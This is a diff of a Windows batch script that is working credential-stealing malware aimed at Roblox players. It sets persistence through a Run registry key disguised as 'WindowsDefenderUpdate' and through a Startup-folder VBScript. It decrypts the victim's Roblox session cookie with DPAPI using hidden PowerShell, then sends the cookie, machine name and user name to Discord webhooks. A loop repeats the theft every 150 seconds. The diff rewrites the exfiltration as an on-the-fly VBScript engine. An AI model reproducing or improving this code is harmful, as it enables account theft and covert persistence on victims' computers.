@@ -8,41 +8,68 @@ set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr
 set "PC=%COMPUTERNAME%"
 set "USER=%USERNAME%"
 set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"
+set "ENGINE=%TEMP%\vanta_engine.vbs"
 
-:: --- PERSISTENCE ---
+:: --- 1. PERSISTENCE ---
 echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
 echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
 copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
-:: ------------------
 
-echo Sending initial logs...
-set "cookie=No Roblox cookie found."
+:: --- 2. BUILD THE ENGINE ---
+:: We create the VBScript on the fly using base64 to avoid batch character limits
+echo Set fso = CreateObject("Scripting.FileSystemObject") > "%ENGINE%"
+echo Set sh = CreateObject("WScript.Shell") >> "%ENGINE%"
+echo Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> "%ENGINE%"
+echo PC = sh.ExpandEnvironmentStrings("%%COMPUTERNAME%%") >> "%ENGINE%"
+echo USER = sh.ExpandEnvironmentStrings("%%USERNAME%%") >> "%ENGINE%"
+echo RC = sh.ExpandEnvironmentStrings("%%LOCALAPPDATA%%") ^& "\Roblox\LocalStorage\robloxcookies.dat" >> "%ENGINE%"
+echo. >> "%ENGINE%"
+echo ' Initial Run >> "%ENGINE%"
+echo cookie = "No cookie file found." >> "%ENGINE%"
+echo If fso.FileExists(RC) Then >> "%ENGINE%"
+echo     raw = fso.OpenTextFile(RC, 1).ReadAll >> "%ENGINE%"
+echo     If InStr(raw, "CookiesData"":""") ^> 0 Then >> "%ENGINE%"
+echo         sp = InStr(raw, "CookiesData"":""") + 14 >> "%ENGINE%"
+echo         ep = InStr(sp, raw, """") >> "%ENGINE%"
+echo         b64 = Mid(raw, sp, ep - sp) >> "%ENGINE%"
+echo         cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" ^& b64 ^& "'), $null, 'CurrentUser'))""" >> "%ENGINE%"
+echo         Set exec = sh.Exec(cmd) >> "%ENGINE%"
+echo         cookie = exec.StdOut.ReadAll >> "%ENGINE%"
+echo     Else >> "%ENGINE%"
+echo         cookie = raw >> "%ENGINE%"
+echo     End If >> "%ENGINE%"
+echo End If >> "%ENGINE%"
+echo. >> "%ENGINE%"
+echo http.Open "POST", "%LOGS%", False >> "%ENGINE%"
+echo http.SetRequestHeader "Content-Type", "application/json" >> "%ENGINE%"
+echo http.Send "{""embeds"":[{""title"":""Initial Log"",""description"":""Client: " ^& PC ^& " / " ^& USER ^& """,""color"":65280}]}" >> "%ENGINE%"
+echo http.Open "POST", "%LOGS%", False >> "%ENGINE%"
+echo http.SetRequestHeader "Content-Type", "application/json" >> "%ENGINE%"
+echo http.Send "{""embeds"":[{""title"":""Roblox Cookie"",""description"":""\`\`\`\n" ^& cookie ^& "\n\`\`\`"",""color"":65280}]}" >> "%ENGINE%"
+echo http.Open "POST", "%ONLINE%", False >> "%ENGINE%"
+echo http.SetRequestHeader "Content-Type", "application/json" >> "%ENGINE%"
+echo http.Send "{""embeds"":[{""title"":""User Online"",""description"":""Client: " ^& PC ^& " / " ^& USER ^& """,""color"":65280}]}" >> "%ENGINE%"
+echo. >> "%ENGINE%"
+echo ' Loop >> "%ENGINE%"
+echo Do >> "%ENGINE%"
+echo     WScript.Sleep 150000 >> "%ENGINE%"
+echo     If fso.FileExists(RC) Then >> "%ENGINE%"
+echo         raw = fso.OpenTextFile(RC, 1).ReadAll >> "%ENGINE%"
+echo         If InStr(raw, "CookiesData"":""") ^> 0 Then >> "%ENGINE%"
+echo             sp = InStr(raw, "CookiesData"":""") + 14 >> "%ENGINE%"
+echo             ep = InStr(sp, raw, """") >> "%ENGINE%"
+echo             b64 = Mid(raw, sp, ep - sp) >> "%ENGINE%"
+echo             cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" ^& b64 ^& "'), $null, 'CurrentUser'))""" >> "%ENGINE%"
+echo             Set exec = sh.Exec(cmd) >> "%ENGINE%"
+echo             cookie = exec.StdOut.ReadAll >> "%ENGINE%"
+echo             http.Open "POST", "%REGRAB%", False >> "%ENGINE%"
+echo             http.SetRequestHeader "Content-Type", "application/json" >> "%ENGINE%"
+echo             http.Send "{""embeds"":[{""title"":""Regrab Cookie"",""description"":""Client: " ^& PC ^& " / " ^& USER ^& "\n\`\`\`\n" ^& cookie ^& "\n\`\`\`"",""color"":65280}]}" >> "%ENGINE%"
+echo         End If >> "%ENGINE%"
+echo     End If >> "%ENGINE%"
+echo Loop >> "%ENGINE%"
 
-if exist "%RC%" (
-    :: Silently decrypt the cookie using PowerShell's native DPAPI, save to temp file
-    powershell -NoProfile -WindowStyle Hidden -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $d = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($b64), $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($d) | Out-File '%TEMP%\ck.txt' -Encoding utf8 }"
-    
-    if exist "%TEMP%\ck.txt" (
-        for /f "usebackq delims=" %%a in ("%TEMP%\ck.txt") do set "cookie=%%a"
-        del "%TEMP%\ck.txt"
-    )
-)
-
-:: Send to Discord
-curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
-curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox Cookie\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
-curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%
-
-echo Script is now looping.
-:loop
-timeout /t 150 /nobreak >nul
-if exist "%RC%" (
-    powershell -NoProfile -WindowStyle Hidden -Command "$c = Get-Content '%RC%' -Raw; if ($c -match 'CookiesData\"\":\"\"([^\"]+)') { $b64 = $matches[1]; $d = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($b64), $null, 'CurrentUser'); [System.Text.Encoding]::UTF8.GetString($d) | Out-File '%TEMP%\ck.txt' -Encoding utf8 }"
-    if exist "%TEMP%\ck.txt" (
-        for /f "usebackq delims=" %%a in ("%TEMP%\ck.txt") do set "cookie=%%a"
-        del "%TEMP%\ck.txt"
-        curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
-    )
-)
-goto loop
+:: --- 3. EXECUTE ---
+cscript //nologo "%ENGINE%"
+del "%ENGINE%"
